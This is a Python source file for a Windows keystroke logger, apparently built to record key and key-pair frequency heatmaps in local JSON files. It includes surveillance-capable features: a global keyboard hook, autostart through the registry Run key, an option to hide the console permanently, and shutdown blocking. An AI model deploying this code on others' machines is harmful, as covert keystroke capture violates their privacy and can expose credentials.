import keyboard
from keyboard import KeyboardEvent
import win32api
import win32event
import win32console
import win32gui
import win32con
import winerror
import json
import os
from os.path import exists, join
import sys
from datetime import date
import time
from threading import Timer
from winreg import SetValueEx, EnumValue, QueryInfoKey, DeleteValue, OpenKey, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
from KeyloggerConfig import KeyloggerConfig
import ctypes
from tabulate import tabulate

# Folder where the pages of your book get logged
BOOK_PATH = 'myBook'
# Config File
CONFIG_FILE = 'keylogger.config.json'
# Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
LOGGER_NAME = "Harmless Keylogger"
# File path
CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
# Directory path
DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))

DEBUG_HISTORY_LENGTH = 10

# Config object
config = {}
# Buffer for Heatmap
heatmap_buffer = {}
heatmap_order = []
# Pressed Keys
pressed_keys = []
# Paused logging
paused = False
# Time when the last save of the heatmap was
last_save = 0
# State of visibility
visible = True
# Import necessary functions from the Windows API
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
# The history for debugging
debug_history = []

def to_tuple(list_in = []):
    return tuple(to_tuple(i) if isinstance(i, list) else i for i in list_in)

# Add to startup for persistence
def add_to_startup():
    global visible
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    reg_value = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' ' + '"' + CURRENT_FILE_PATH + '"'
    value_name = LOGGER_NAME + " " + config.get_file_prefix()

    try:
        if key2change:
            SetValueEx(key2change, value_name, 0, REG_SZ, reg_value)
            if visible:
                print("Keylogger applied to startup.")
            CloseKey(key2change)
    except Exception as e:
        if visible:
            print("Error occurred while applying keylogger to startup:")
            print(e)

# Remove from startup 
def remove_from_startup():
    global visible
    key_val = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    value_name = LOGGER_NAME + " " + config.get_file_prefix()
    
    try:
        if key2change:
            sub_key_count, value_count, change = QueryInfoKey(key2change)
            i = 0
            while i < value_count:
                name, value, type = EnumValue(key2change, i)
                i = i + 1
                if name == value_name:
                    DeleteValue(key2change, value_name)
        if visible:
            print("Keylogger removed from startup.")
            CloseKey(key2change)
    except Exception as e:
        if visible:
            print(e)

# Debug logger
def log_debug():
    global config, heatmap_order, heatmap_buffer, debug_history
    if not config.get_hide() == "allways":
        # Collect last N key events
        rows = []
        for entry in debug_history[-DEBUG_HISTORY_LENGTH:]:
            rows.append([
                entry.get("time"),
                entry.get("scancode"),
                entry.get("char"),
                entry.get("value"),
                entry.get("pressed"),
            ])
        # After printing, remove the printed entries from debug_history
        del_count = len(rows)
        debug_history = debug_history[:-del_count] if len(debug_history) >= del_count else []
        if len(rows) > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            headers = ["Time", "ScanCode", "Char", "Value", "Pressed"]
            print(tabulate(rows, headers, tablefmt="grid"))

# Function to block shutdown
def block_shutdown():
    user32.ShutdownBlockReasonCreate(win32console.GetConsoleWindow(), "Saving file, please wait...")

# Function to allow shutdown
def allow_shutdown():
    user32.ShutdownBlockReasonDestroy(win32console.GetConsoleWindow())

# Append file with pressed keys
def log_local():
    global config, heatmap_buffer 
    # Prevent shutdown
    block_shutdown()
    # Remove elements with mentions = 0     
    unused = []
    for k,v in heatmap_buffer.items():
        if v["mentions"] == 0:
            unused.append(k)
    for k in unused:
        del heatmap_buffer[k]
    # Sort elements by mentions
    sorted_buffer = sorted(heatmap_buffer.items(), key=lambda x:x[1]["mentions"], reverse=True)
    heatmap_buffer = dict(sorted_buffer)
    # Save in file
    path = join(DIR_PATH, os.pardir, BOOK_PATH)
    if not exists(path):
        os.makedirs(path) 
    file = join(path, (("" if config.get_file_prefix() == "" else config.get_file_prefix() + "_") + date.today().strftime('%Y-%m-%d') + ".heatmap" + ".json"))
    with open(file, "w") as write_file:
        json.dump(heatmap_buffer, write_file, indent=4)
    # Allow shutdown
    allow_shutdown()

def log_key_press(key: KeyboardEvent, pressed_keys: list):
    # Save in file
    path = join(DIR_PATH, os.pardir, BOOK_PATH)
    if not exists(path):
        os.makedirs(path) 
    file = join(path, (("" if config.get_file_prefix() == "" else config.get_file_prefix() + "_") + date.today().strftime('%Y-%m-%d') + ".list" + ".json"))
    
    data = []
    if exists(file):
        with open(file) as f:
            data = json.load(f)
   
    data.append({
            "name": key.name,
            "scancode": key.scan_code,
            "pressed": pressed_keys
        })  

    data = sorted(data, key=lambda d: d['scancode'])

    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# Log with configured output
def log_keys():
    global config, last_save
    if config.get_output() == "local":   
        log_local()
    elif config.get_output() == "debug":
        log_debug()

    # Remove pressed keys there are to old
    delete_old_key_presses()

    # Start Timer
    timer = Timer(config.get_save_intervall()/1000, log_keys)
    timer.name = "Logging"
    timer.start()

def delete_old_key_presses(now_ms = round(time.time_ns() / 1000)):   
    if not config.get_processing_time() == -1:
        to_old = []
        for e in heatmap_order:
            if now_ms - e["time"] > config.get_processing_time():
                to_old.append(e)
        for k in to_old:
            heatmap_order.remove(k)
    
def add_to_heatmap_buffer(hash_name, key_pressed):
    if hash_name in heatmap_buffer and "mentions" in heatmap_buffer[hash_name]:
        # Increase count of existing
        heatmap_buffer[hash_name]["mentions"] = heatmap_buffer[hash_name]["mentions"] + 1
    else:
        # Add new key
        key_pressed["mentions"] = 1
        heatmap_buffer[hash_name] = key_pressed

def key_callback(event: KeyboardEvent):
    global heatmap_buffer, heatmap_order, paused, pressed_keys, debug_history

    # while paused no logging
    if paused:
        return    

    # event key up 
    if event.event_type == 'down':
        # add keys to pressed state
        if(not event.scan_code in pressed_keys):
            pressed_keys.append(event.scan_code)
        return

    now_ms = event.time * 1000

    # Remove pressed keys there are to old
    delete_old_key_presses(now_ms)
    
    # Console output
    if config.get_output() == 'console':
        print("event:",{
            "name": event.name,
            "event_type": event.event_type,
            "scan_code": event.scan_code,
            "pressed": pressed_keys.copy(),
            "time": now_ms,
            "device": event.device,
            "is_keypad": event.is_keypad,
            "modifiers": event.modifiers
        })
        # remove keys from pressed state
        if(event.scan_code in pressed_keys):
            pressed_keys.remove(event.scan_code)
        return
    
    # Full log list
    log_key_press(event, pressed_keys.copy())
    
    key_pressed = {}
    # Key Represention
    # Shift
    if event.scan_code == 42 or event.scan_code == 54 or event.scan_code == 58:
        # remove keys from pressed state
        if(event.scan_code in pressed_keys):
            pressed_keys.remove(event.scan_code)
        return
    # Space
    elif event.name == 'space':
        key_pressed = {
            "name": [event.name],
            "scancode": [event.scan_code],
            "pressed": [pressed_keys.copy()],
            "value": [" "],
            "length": 1
        }
    # Enter
    elif event.name == 'enter':
        key_pressed = {
            "name": [event.name],
            "scancode": [event.scan_code],
            "pressed": [pressed_keys.copy()],
            "value": ["\n"],
            "length": 1
        }
    # Backspace
    elif event.name == 'backspace':
        if config.get_exclude_typos():
            if len(heatmap_order) > 0:
                if len(heatmap_order[-1]["key"]) == 1:
                    heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] - 1
                elif len(heatmap_order[-1]["key"]) == 2:
                    heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] - 1
                    heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] = heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] - 1
                heatmap_order.pop()
    # Letters
    elif len(event.name) == 1:
        key_pressed = {
        "name": [event.name],
        "scancode": [event.scan_code],
        "pressed": [pressed_keys.copy()],
        "value": [event.name],
        "length": 1
        }
    
    # Add to debug history
    debug_history.append({
        "time": now_ms,
        "scancode": event.scan_code,
        "char": event.name,
        "value": key_pressed.get("value", [""])[0] if key_pressed else "",
        "pressed": pressed_keys.copy(),
    })
    
    if not key_pressed == {}:        
        # Add combination key to heatmap
        if len(heatmap_order) > 0 and now_ms - heatmap_order[-1]["time"] < config.get_combination_time():
            temp = {}
            # Key combination
            temp["name"] = [heatmap_buffer[heatmap_order[-1]["key"]]["name"][-1], key_pressed["name"][0]]
            temp["scancode"] = [heatmap_buffer[heatmap_order[-1]["key"]]["scancode"][-1], key_pressed["scancode"][0]]
            temp["pressed"] = [heatmap_buffer[heatmap_order[-1]["key"]]["pressed"][-1], key_pressed["pressed"][0]]
            temp["value"] = [heatmap_buffer[heatmap_order[-1]["key"]]["value"][-1], key_pressed["value"][0]]
            temp["length"] = 2
            
            # Add combination to heatmap
            key = temp["name"][0] + temp["name"][1]
            print(key)
            add_to_heatmap_buffer(key, temp)
        
        # Add single key to heatmap
        key = key_pressed["name"][0]
        add_to_heatmap_buffer(key, key_pressed)

        # Add key to currently pressed keys
        heatmap_order.append({
            "key": key,
            "time": now_ms
        })

    # remove keys from pressed state
    if(event.scan_code in pressed_keys):
        pressed_keys.remove(event.scan_code)


def pause_logging():
    global paused, visible
    if visible:
        print(LOGGER_NAME + (" paused" if not paused else " continue"))
    paused = not paused

def read_heatmap():
    path = join(DIR_PATH, os.pardir, BOOK_PATH)
    file = join(path, (("" if config.get_file_prefix() == "" else config.get_file_prefix() + "_") + date.today().strftime('%Y-%m-%d') + ".heatmap" + ".json"))
    if exists(file) and not os.stat(file).st_size == 0:
        with open(file, "r") as read_file:
            global heatmap_buffer
            heatmap_buffer = json.load(read_file)
            return True
    return False    

def hide():
    global visible
    if config.get_hide() == "never":
        print("Change visibillity is with this config not allowed!")
    elif visible: 
        # Hide Console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
        visible = False
        return True
    elif not config.get_hide() == "allways":
        # Unhide Console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_NORMAL)
        visible = True
        return True
    return False

def save_and_exit():
    if config.get_output() == "local":
        if not log_local() and visible:
            print("Something went wrong while saving!")
    if visible:
        print(LOGGER_NAME + " stopped.")
    keyboard.unhook_all()
    os._exit(0)


def main():
    global visible
    if visible:
        print(LOGGER_NAME + " started")
    # Hide comand prompt
    if config.get_hide() == "ready":
        timer = Timer(5, hide)
        timer.name = "Ready cooldown"
        timer.start()
    log_keys()
    # Attache callback for keypress
    keyboard.hook(key_callback)
    # To Pause the Keylogger (ctrl + alt + p)
    keyboard.add_hotkey(config.get_pause_hotkey(), pause_logging)
    # To save the buffer (ctrl + alt + s)
    keyboard.add_hotkey(config.get_save_hotkey(), log_local)
    # To toggle visibillity of window (ctrl + alt + v)
    keyboard.add_hotkey(config.get_visible_hotkey(), hide)
    # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
    keyboard.add_hotkey(config.get_exit_hotkey(), save_and_exit)
    keyboard.wait() 

if __name__ == '__main__':
    # Read the configurarion
    config = KeyloggerConfig()
    config.read_config(join(DIR_PATH, CONFIG_FILE)) 
    if visible:
        print("Successfully load configuration.")

    # Hide comand prompt
    if config.get_hide() == "allways" or config.get_hide() == "instant":
        hide()

    # Disallowing multiple instances with same prefix
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + config.get_file_prefix())
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        if visible:
            print("Multiple instances are not allowed")
        exit(0)

    # Add to startup
    if config.get_auto_start():
        add_to_startup()
    else: 
        remove_from_startup()

    # Read already saved values 
    if read_heatmap():
        if visible:
            print("Loaded existing heatmap.")
    else:
        if visible:
            print("No Heatmap for today exist. Will be created.")

    # Setup save time
    last_save = round(time.time_ns() / 1000000)

    main()
